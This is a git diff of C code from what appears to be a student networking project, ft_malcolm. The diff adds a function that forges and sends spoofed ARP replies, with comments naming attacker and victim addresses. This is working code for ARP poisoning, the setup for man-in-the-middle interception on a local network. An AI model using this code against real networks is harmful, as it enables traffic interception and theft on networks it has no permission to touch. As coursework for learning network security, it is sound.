@@ -6,13 +6,48 @@
 /*   By: nponchon <nponchon@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/04 18:38:53 by nponchon          #+#    #+#             */
-/*   Updated: 2025/11/14 14:32:45 by nponchon         ###   ########.fr       */
+/*   Updated: 2025/11/14 16:59:47 by nponchon         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "../incs/ft_malcolm.h"
 
 extern int g_sigint;
+
+struct ether_arp	forge_arp(struct ether_arp *original_arp, t_malcolm *m)
+{
+	struct ether_arp forged_arp;
+
+	ft_memcpy(&forged_arp, original_arp, sizeof(struct ether_arp));
+	forged_arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
+
+	// Set sender MAC and IP to attacker's values
+	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+		&forged_arp.arp_sha[0], &forged_arp.arp_sha[1], &forged_arp.arp_sha[2],
+		&forged_arp.arp_sha[3], &forged_arp.arp_sha[4], &forged_arp.arp_sha[5]);
+
+	inet_pton(AF_INET, m->source_ip, forged_arp.arp_spa);
+
+	// Set target MAC and IP to victim's values
+	sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+		&forged_arp.arp_tha[0], &forged_arp.arp_tha[1], &forged_arp.arp_tha[2],
+		&forged_arp.arp_tha[3], &forged_arp.arp_tha[4], &forged_arp.arp_tha[5]);
+
+	inet_pton(AF_INET, m->target_ip, forged_arp.arp_tpa);
+
+	printf("Forged ARP reply:\n");
+	printf("  Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+		forged_arp.arp_sha[0], forged_arp.arp_sha[1], forged_arp.arp_sha[2],
+		forged_arp.arp_sha[3], forged_arp.arp_sha[4], forged_arp.arp_sha[5]);
+	printf("  Sender IP: %s\n", m->source_ip);
+	printf("  Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+		forged_arp.arp_tha[0], forged_arp.arp_tha[1], forged_arp.arp_tha[2],
+		forged_arp.arp_tha[3], forged_arp.arp_tha[4], forged_arp.arp_tha[5]);
+	printf("  Target IP: %s\n", m->target_ip);
+	printf("  Operation: ARP Reply\n");
+
+	return (forged_arp);
+}
 
 void	send_arp(t_malcolm *m, unsigned char *buf)
 {
@@ -25,6 +60,14 @@ void	send_arp(t_malcolm *m, unsigned char *buf)
     inet_ntop(AF_INET, arp->arp_spa, sender_ip, sizeof(sender_ip));
     inet_ntop(AF_INET, arp->arp_tpa, target_ip, sizeof(target_ip));
 	printf("Sending forged ARP reply to %s\n", target_ip);
+
+	struct ether_arp forged_arp = forge_arp(arp, m);
+	ssize_t bytes_sent = send(m->socket, &forged_arp, sizeof(forged_arp), 0);
+	if (bytes_sent < 0) {
+		fprintf(stderr, "Error: unable to send forged ARP reply\n");
+	} else {
+		printf("Successfully sent forged ARP reply (%zd bytes)\n", bytes_sent);
+	}
 
 	return ;
 }
